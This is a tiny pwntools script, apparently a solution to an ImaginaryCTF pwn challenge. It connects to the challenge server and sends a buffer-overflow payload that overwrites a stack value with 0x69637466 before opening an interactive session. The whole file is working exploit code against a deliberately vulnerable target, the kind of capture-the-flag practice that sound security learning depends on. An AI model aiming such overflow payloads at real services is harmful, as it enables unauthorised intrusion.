from pwn import *

p = remote('chal.imaginaryctf.org', 42001)

p.sendline(b'A'*(0x30-0x8)+p64(0x69637466))

p.interactive()